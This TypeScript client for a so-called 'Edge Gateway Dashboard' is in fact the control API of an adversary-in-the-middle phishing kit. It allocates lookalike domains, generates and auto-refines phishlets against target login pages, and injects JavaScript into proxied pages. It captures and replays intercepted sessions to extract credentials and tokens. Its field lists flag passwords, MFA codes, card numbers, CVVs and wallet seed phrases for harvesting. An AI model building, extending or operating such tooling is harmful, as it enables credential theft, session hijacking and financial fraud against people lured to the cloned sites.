/** Wraps a fetch call with network-error handling, throwing a clear message instead of a bare TypeError. */
async function safeFetch(url: string, init?: RequestInit): Promise<Response> {
  try {
    return await fetch(url, init);
  } catch {
    throw new Error(
      "Network error — cannot reach the gateway. Verify the gateway URL is correct and the service is online.",
    );
  }
}

/**
 * API client for the Edge Gateway Dashboard. Talks to the Rork-hosted
 * Cloudflare Worker that fronts the ItemsStore Durable Object.
 */

declare const process: { env: Record<string, string | undefined> };

let BASE_URL = process.env.EXPO_PUBLIC_RORK_FUNCTIONS_URL || "";

export function getBaseUrl(): string {
  return BASE_URL.replace(/\/$/, "");
}

export function setBaseUrl(url: string): void {
  BASE_URL = url.replace(/\/$/, "");
}

export type Item = {
  id: number;
  name: string;
  description: string;
  createdAt: number;
  updatedAt: number;
};

export type GatewayMeta = {
  latencyMs: number;
  cache: string | null;
  edgeLatency: string | null;
  rateLimit: number | null;
  rateRemaining: number | null;
};

export type HealthResult = {
  status: string;
  timestamp: string;
  uptime: number;
  itemCount: number;
  region: string;
  meta: GatewayMeta;
};

function readMeta(response: Response, latencyMs: number): GatewayMeta {
  const num = (key: string): number | null => {
    const raw = response.headers.get(key);
    return raw === null ? null : Number(raw);
  };
  return {
    latencyMs,
    cache: response.headers.get("X-Cache"),
    edgeLatency: response.headers.get("X-Edge-Latency"),
    rateLimit: num("X-RateLimit-Limit"),
    rateRemaining: num("X-RateLimit-Remaining"),
  };
}

async function parse<T>(response: Response): Promise<T> {
  let text: string;
  try {
    text = await response.text();
  } catch {
    throw new Error("Network error — the gateway is unreachable. Check your connection and gateway URL.");
  }
  let json: unknown = {};
  if (text) {
    try {
      json = JSON.parse(text);
    } catch {
      // The gateway returned something that isn't JSON (e.g. an HTML error page,
      // a 502 from the hosting platform, or a misconfigured redirect). Surface a
      // sanitised snippet so the user can diagnose without leaking full payloads.
      const snippet = text.slice(0, 200).replace(/\n/g, " ").trim();
      throw new Error(
        `Gateway returned non-JSON response (${response.status}). ` +
        `Verify the gateway URL is correct and the service is healthy. ` +
        `Response starts with: "${snippet}${text.length > 200 ? "…" : ""}"`,
      );
    }
  }
  if (!response.ok) {
    const message =
      (json as { error?: string }).error ?? `Request failed (${response.status})`;
    throw new Error(message);
  }
  return json as T;
}

// ── Authentication (email + password) ──

export type AuthUser = { id: number; email: string; name: string };
export type AuthSession = { token: string; user: AuthUser };

/** Register a new account and return a session token + user. */
export async function signup(input: {
  email: string;
  password: string;
  name?: string;
}): Promise<AuthSession> {
  const response = await safeFetch(`${BASE_URL}/api/auth/signup`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: AuthSession }>(response);
  return data.data;
}

/** Sign in with email + password and return a session token + user. */
export async function login(input: {
  email: string;
  password: string;
}): Promise<AuthSession> {
  const response = await safeFetch(`${BASE_URL}/api/auth/login`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: AuthSession }>(response);
  return data.data;
}

/** Invalidate the current session token on the server. Best-effort. */
export async function logout(token: string): Promise<void> {
  await safeFetch(`${BASE_URL}/api/auth/logout`, {
    method: "POST",
    headers: { Authorization: `Bearer ${token}` },
  }).catch(() => undefined);
}

/** Resolve the current user from a stored session token. Throws if invalid/expired. */
export async function fetchMe(token: string): Promise<AuthUser> {
  const response = await safeFetch(`${BASE_URL}/api/auth/me`, {
    cache: "no-store",
    headers: { Authorization: `Bearer ${token}` },
  });
  const data = await parse<{ data: { user: AuthUser } }>(response);
  return data.data.user;
}

export async function fetchHealth(): Promise<HealthResult> {
  const start = Date.now();
  const response = await safeFetch(`${BASE_URL}/health`, { cache: "no-store" });
  const latencyMs = Date.now() - start;
  const data = await parse<Omit<HealthResult, "meta">>(response);
  return { ...data, meta: readMeta(response, latencyMs) };
}

export type ItemsResult = { items: Item[]; meta: GatewayMeta };

export async function fetchItems(): Promise<ItemsResult> {
  const start = Date.now();
  const response = await safeFetch(`${BASE_URL}/api/items`, { cache: "no-store" });
  const latencyMs = Date.now() - start;
  const data = await parse<{ data: Item[] }>(response);
  return { items: data.data, meta: readMeta(response, latencyMs) };
}

export async function createItem(input: {
  name: string;
  description: string;
}, authHeader?: string): Promise<Item> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE_URL}/api/items`, {
    method: "POST",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: Item }>(response);
  return data.data;
}

export async function updateItem(
  id: number,
  input: { name: string; description: string },
  authHeader?: string,
): Promise<Item> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE_URL}/api/items/${id}`, {
    method: "PUT",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: Item }>(response);
  return data.data;
}

export type TrafficEntry = {
  id: number;
  ts: number;
  method: string;
  path: string;
  status: number;
  latencyMs: number;
  cache: string;
  ip: string;
  country: string;
  colo: string;
  proxy: string;
};

export type Proxy = {
  id: number;
  slug: string;
  name: string;
  targetUrl: string;
  enabled: boolean;
  hits: number;
  /** A purchased Cloudflare domain allocated to route this target. */
  proxyDomain: string;
  /** Whether intercept lab mode should capture payloads for this target. */
  interceptEnabled: boolean;
  /** Cloudflare zone ID where the proxy DNS record lives (for cleanup). */
  cfZoneId: string;
  /** Cloudflare DNS record ID for the allocated CNAME (for cleanup). */
  cfRecordId: string;
  /** Custom JS snippet injected into proxied HTML pages. */
  injectJs: string;
  /** Whether the custom JS snippet is active. */
  injectJsEnabled: boolean;
  /** Auto-generated YAML phishlet config for this target. */
  phishlet: string;
  createdAt: number;
  updatedAt: number;
};

export type CloudflareZone = {
  id: string;
  name: string;
  status: string;
};

export type ZonesResult = {
  configured: boolean;
  zones: CloudflareZone[];
  error?: string;
};

/**
 * Lists the purchased domains in the connected Cloudflare account. Returns
 * `configured: false` (without throwing) when credentials are not set yet.
 */
export async function fetchCloudflareZones(authHeader?: string): Promise<ZonesResult> {
  const headers: Record<string, string> = {};
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE_URL}/api/cloudflare/zones`, {
    cache: "no-store",
    headers,
  });
  const text = await response.text();
  let zonesJson: { success?: boolean; configured?: boolean; data?: CloudflareZone[]; error?: string } = {};
  if (text) {
    try { zonesJson = JSON.parse(text); } catch { zonesJson = { success: false, error: "Invalid JSON response from gateway" }; }
  }
  if (!zonesJson.success) {
    return {
      configured: zonesJson.configured ?? false,
      zones: [],
      error: zonesJson.error,
    };
  }
  return { configured: true, zones: zonesJson.data ?? [] };
}

/**
 * Allocates a purchased Cloudflare domain to a proxy target. Creates the DNS
 * record pointing at the gateway and stores the hostname on the target.
 */
export async function allocateProxyDomain(
  input: { proxyId: number; zoneId: string; hostname: string },
  authHeader?: string,
): Promise<{ hostname: string; target: string }> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE_URL}/api/cloudflare/allocate`, {
    method: "POST",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: { hostname: string; target: string } }>(
    response,
  );
  return data.data;
}

/** The public edge URL that routes through a configured proxy target. */
export function proxyUrl(slug: string): string {
  return `${BASE_URL}/proxy/${slug}`;
}

export async function fetchProxies(): Promise<Proxy[]> {
  const response = await safeFetch(`${BASE_URL}/api/proxies`, { cache: "no-store" });
  const data = await parse<{ data: Proxy[] }>(response);
  return data.data;
}

export async function createProxy(input: {
  name: string;
  targetUrl: string;
}, authHeader?: string): Promise<Proxy> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE_URL}/api/proxies`, {
    method: "POST",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: Proxy }>(response);
  return data.data;
}

export async function updateProxy(
  id: number,
  input: Partial<{ name: string; targetUrl: string; enabled: boolean; interceptEnabled: boolean; injectJs: string; injectJsEnabled: boolean; phishlet: string }>,
  authHeader?: string,
): Promise<Proxy> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE_URL}/api/proxies/${id}`, {
    method: "PUT",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: Proxy }>(response);
  return data.data;
}

export async function deleteProxy(id: number, authHeader?: string): Promise<void> {
  const headers: Record<string, string> = {};
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE_URL}/api/proxies/${id}`, {
    method: "DELETE",
    headers,
  });
  await parse<{ data: Proxy }>(response);
}

export type ReconInput = {
  targetUrl: string;
  captured: {
    urls?: string[];
    cookies?: string[];
    formFields?: { name: string; type: string; id?: string; placeholder?: string }[];
    redirects?: string[];
    domains?: string[];
    pageTitle?: string;
    formAction?: string;
    formMethod?: string;
  };
};

export type ReconResult = {
  proxyId: number;
  phishlet: string;
};

/**
 * Sends captured reconnaissance data to the worker and returns a generated
 * YAML phishlet config. The worker also saves the phishlet on the proxy.
 */
export async function generatePhishlet(
  proxyId: number,
  input: ReconInput,
  authHeader?: string,
): Promise<ReconResult> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE_URL}/api/proxies/${proxyId}/recon`, {
    method: "POST",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: ReconResult }>(response);
  return data.data;
}

export type WorkerRoute = {
  id: string;
  pattern: string;
  script: string;
  zoneId?: string;
  zoneName?: string;
};

export type WorkerRoutesResult = {
  configured: boolean;
  routes: WorkerRoute[];
  error?: string;
};

export async function fetchWorkerRoutes(authHeader?: string): Promise<WorkerRoutesResult> {
  const headers: Record<string, string> = {};
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE_URL}/api/cloudflare/worker-routes`, {
    cache: "no-store",
    headers,
  });
  const text = await response.text();
  let routesJson: { success?: boolean; configured?: boolean; data?: WorkerRoute[]; error?: string } = {};
  if (text) {
    try { routesJson = JSON.parse(text); } catch { routesJson = { success: false, error: "Invalid JSON response from gateway" }; }
  }
  if (!routesJson.success) {
    return { configured: routesJson.configured ?? false, routes: [], error: routesJson.error };
  }
  return { configured: true, routes: routesJson.data ?? [] };
}

export async function deleteWorkerRoute(
  routeId: string,
  zoneId: string,
  authHeader?: string,
): Promise<void> {
  const headers: Record<string, string> = {};
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE_URL}/api/cloudflare/worker-routes/${zoneId}/${routeId}`, {
    method: "DELETE",
    headers,
  });
  await parse<{ success: boolean }>(response);
}

export type InterceptCapture = {
  id: number;
  ts: number;
  slug: string;
  method: string;
  path: string;
  reqHeaders: string;
  reqBody: string;
  respStatus: number;
  respHeaders: string;
  respBody: string;
  host: string;
};

/** Lists all intercept captures from the gateway. */
export async function fetchIntercepts(authHeader?: string): Promise<InterceptCapture[]> {
  const headers: Record<string, string> = { "X-Intercept-TTL": "600" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE_URL}/api/intercepts`, {
    cache: "no-store",
    headers,
  });
  const data = await parse<{ data: InterceptCapture[]; count: number }>(response);
  return data.data;
}

/** Wipes all intercept captures from the gateway. */
export async function deleteIntercepts(authHeader?: string): Promise<void> {
  const headers: Record<string, string> = {};
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE_URL}/api/intercepts`, {
    method: "DELETE",
    headers,
  });
  await parse<{ success: boolean }>(response);
}

export async function deleteItem(id: number, authHeader?: string): Promise<void> {
  const headers: Record<string, string> = {};
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE_URL}/api/items/${id}`, {
    method: "DELETE",
    headers,
  });
  await parse<{ data: Item }>(response);
}

export type TrafficStats = {
  total: number;
  avgLatency: number;
  errorCount: number;
  cacheHits: number;
};

export type TrafficResult = {
  entries: TrafficEntry[];
  stats: TrafficStats;
  meta: GatewayMeta;
};

/** Reads the gateway's intercepted traffic feed (ring buffer of recent requests). */
export async function fetchTraffic(): Promise<TrafficResult> {
  const start = Date.now();
  const response = await safeFetch(`${BASE_URL}/api/traffic`, { cache: "no-store" });
  const latencyMs = Date.now() - start;
  const data = await parse<{ data: TrafficEntry[]; stats: TrafficStats }>(response);
  return {
    entries: data.data,
    stats: data.stats,
    meta: readMeta(response, latencyMs),
  };
}

export type WorkerConfig = Record<string, string>;

/** Fetches the current effective worker config (runtime overrides merged with defaults). */
export async function fetchWorkerConfig(authHeader?: string): Promise<WorkerConfig> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE_URL}/api/config`, {
    cache: "no-store",
    headers,
  });
  const data = await parse<{ data: WorkerConfig }>(response);
  return data.data;
}

/** Persists runtime config overrides to the Durable Object. */
export async function updateWorkerConfig(
  entries: Record<string, string>,
  authHeader?: string,
): Promise<WorkerConfig> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE_URL}/api/config`, {
    method: "PUT",
    headers,
    body: JSON.stringify(entries),
  });
  const data = await parse<{ data: WorkerConfig }>(response);
  return data.data;
}

/** Clears all runtime config overrides, reverting to wrangler defaults. */
export async function deleteWorkerConfig(authHeader?: string): Promise<WorkerConfig> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE_URL}/api/config`, {
    method: "DELETE",
    headers,
  });
  const data = await parse<{ data: WorkerConfig }>(response);
  return data.data;
}

/** Sensitive-field patterns for masking in the UI — stored as a Set for O(1) lookup. */
const _SENSITIVE_FIELDS_ARR = [
  // Passwords
  "password", "passwd", "pass", "pwd", "passcode", "passphrase",
  "new_password", "old_password", "current_password", "confirm_password",
  "newpassword", "oldpassword", "currentpassword", "confirmpassword",
  // Secrets / keys
  "secret", "api_key", "apikey", "api_secret", "apisecret",
  "client_secret", "app_secret", "private_key", "privatekey",
  "signing_key", "encryption_key", "webhook_secret",
  // Tokens (auth)
  "token", "access_token", "refresh_token", "id_token", "auth_token",
  "bearer", "authorization", "x-auth-token", "x-api-key",
  "oauth_token", "oauth_token_secret", "oauth_verifier",
  "code", "auth_code", "authorization_code",
  // Session / cookies
  "session", "session_id", "sessionid", "session_token",
  "cookie", "csrf", "csrf_token", "xsrf", "xsrf_token",
  "_token", "__token", "authenticity_token",
  // JWT
  "jwt", "id_token", "nonce",
  // MFA / OTP
  "otp", "totp", "hotp", "mfa_code", "mfa_token", "two_factor",
  "twofactor", "2fa", "verification_code", "verificationcode",
  "sms_code", "smscode", "backup_code", "recovery_code",
  // Payment / financial
  "card", "card_number", "cardnumber", "pan",
  "cvv", "cvc", "cvv2", "csc",
  "pin", "card_pin", "atm_pin",
  "expiry", "expiration", "exp_date", "expdate",
  "ssn", "social_security", "tax_id", "ein",
  "iban", "bsb", "routing_number", "account_number",
  "bank_account", "sort_code",
  // Crypto
  "mnemonic", "seed_phrase", "private_key", "keystore",
  "wallet_password", "wallet_key",
];

/** Credential/identity field patterns shown prominently in the intercept UI. */
const _CREDENTIAL_FIELDS_ARR = [
  // === IDENTITY — shown first ===
  // Username variants
  "username", "user_name", "user", "uname", "login_name", "loginname",
  "handle", "screen_name", "screenname", "display_name", "displayname",
  "nick", "nickname", "alias",
  // Email variants
  "email", "email_address", "emailaddress", "mail", "e_mail", "e-mail",
  "login_email", "account_email", "contact_email",
  // Phone variants
  "phone", "phone_number", "phonenumber", "mobile", "mobile_number",
  "msisdn", "cell", "cellphone", "telephone", "tel",
  // Login / account identifiers
  "login", "loginid", "login_id",
  "account", "account_id", "accountid", "account_name", "accountname",
  "member", "member_id", "memberid", "membership_id", "membershipid",
  "customer", "customer_id", "customerid", "client", "client_id", "clientid",
  "player", "player_id", "playerid",
  "userid", "user_id", "uid",
  "subscriber", "subscriber_id",
  "identity", "identity_number", "national_id",
  // === PASSWORDS — shown after identity ===
  "password", "passwd", "pass", "pwd", "passcode", "passphrase",
  "new_password", "old_password", "confirm_password",
  // === MFA / OTP ===
  "otp", "totp", "mfa_code", "two_factor", "2fa",
  "verification_code", "sms_code", "backup_code",
  // === OAUTH / SSO ===
  "code", "auth_code", "authorization_code", "oauth_token",
  "id_token", "access_token",
  // === PAYMENT / FINANCIAL ===
  "card_number", "pan", "cvv", "cvc", "pin",
  "expiry", "expiration", "iban", "account_number",
  // === CRYPTO ===
  "wallet", "wallet_address", "address", "mnemonic",
];

/** Sensitive-field patterns for masking in the UI — Set for O(1) lookup. */
export const SENSITIVE_FIELDS: ReadonlySet<string> = new Set(_SENSITIVE_FIELDS_ARR);

/** Credential/identity field patterns shown prominently in the intercept UI — Set for O(1) lookup. */
export const CREDENTIAL_FIELDS: ReadonlySet<string> = new Set(_CREDENTIAL_FIELDS_ARR);

/** Mask a value by showing first 2 and last 2 characters. */
export function maskValue(value: string): string {
  if (!value || value.length <= 6) return "***";
  return `${value.slice(0, 2)}${'*'.repeat(Math.min(value.length - 4, 12))}${value.slice(-2)}`;
}

// ── HAR (HTTP Archive) export ──

/**
 * Generates a HAR 1.2 JSON file from all stored intercept captures.
 * Compatible with Chrome DevTools, Charles Proxy, and most traffic analysis tools.
 */
export async function fetchHarExport(authHeader?: string): Promise<{ harJson: string; fileName: string }> {
  const headers: Record<string, string> = {};
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE_URL}/api/intercepts/har`, {
    cache: "no-store",
    headers,
  });
  const text = await response.text();
  if (!response.ok) {
    let harErr: { error?: string } = {};
    if (text) { try { harErr = JSON.parse(text); } catch { /* ignore */ } }
    throw new Error(harErr.error ?? `HAR export failed (${response.status})`);
  }
  const disposition = response.headers.get("Content-Disposition") ?? "";
  const fileNameMatch = disposition.match(/filename[^;=\n]*=((['"]).*?\2|[^;\n]*)/);
  const fileName = fileNameMatch?.[1]?.replace(/['"]/g, "") ?? `edge-gateway-${new Date().toISOString().slice(0, 10)}.har`;
  return { harJson: text, fileName };
}

// ── Replay engine ──

export type ReplayEntry = {
  index: number;
  method: string;
  url: string;
  status: number;
  latencyMs: number;
  redirectUrl: string | null;
  cookies: string[];
  credentials: Record<string, string>;
  error?: string;
};

export type ReplayReport = {
  total: number;
  succeeded: number;
  failed: number;
  entries: ReplayEntry[];
  extractedTokens: string[];
  flowSummary: string;
};

// ── Multi-pass phishlet iteration ──

export type CritiqueEntry = {
  pass: number;
  finding: string;
  severity: "critical" | "warning" | "info";
  fix: string;
};

export type IterateResult = {
  proxyId: number;
  phishlet: string;
  passes: number;
  critiques: CritiqueEntry[];
  improvements: string[];
  score: number;
};

/**
 * Runs multi-pass self-critique on a generated phishlet YAML.
 * The Worker fetches the target through residential proxies, submits synthetic
 * credentials, follows redirects, detects missing fields, CSRF tokens, and
 * auth cookies, then iteratively fixes the YAML across multiple passes.
 */
export async function iteratePhishlet(
  proxyId: number,
  input: { phishlet: string; captured: ReconInput["captured"] },
  authHeader?: string,
): Promise<IterateResult> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE_URL}/api/proxies/${proxyId}/recon/iterate`, {
    method: "POST",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: IterateResult }>(response);
  return data.data;
}

/**
 * Replays a HAR session through a configured proxy target.
 * Sequentially executes each request, tracks cookies, and extracts credentials.
 */
export async function replayHar(
  input: { har: string; proxySlug: string },
  authHeader?: string,
): Promise<ReplayReport> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE_URL}/api/replay`, {
    method: "POST",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: ReplayReport }>(response);
  return data.data;
}
